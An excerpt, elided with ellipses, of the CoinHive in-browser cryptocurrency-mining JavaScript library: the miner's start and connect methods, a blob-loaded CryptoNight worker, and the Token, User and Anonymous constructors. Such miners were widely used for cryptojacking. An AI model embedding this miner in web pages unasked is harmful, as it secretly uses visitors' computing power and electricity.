...
Miner.prototype.start = function(mode) {
  ...
  if (this._useWASM || this._asmjsStatus === "loaded") {
    ...
    xhr.addEventListener("load", function() {
      CoinHive.CRYPTONIGHT_WORKER_BLOB = URL.createObjectURL(new Blob([xhr.responseText]));
...
Miner.prototype._connect = function() {
  ...
  var proxies = shards[this._hashString(this._siteKey) % shards.length];
...
CoinHive = CoinHive || {};
CoinHive.IF_EXCLUSIVE_TAB = "ifExclusiveTab";
CoinHive.FORCE_EXCLUSIVE_TAB = "forceExclusiveTab";
CoinHive.FORCE_MULTI_TAB = "forceMultiTab";
CoinHive.Token = function(siteKey, goal, params) {
  var miner = new Miner(siteKey, params);
  miner._goal = goal || 0;
  return miner
};
CoinHive.User = function(siteKey, user, params) {
  var miner = new Miner(siteKey, params);
  miner._user = user;
  return miner
};
CoinHive.Anonymous = function(siteKey, params) {
  var miner = new Miner(siteKey, params);
  return miner
}
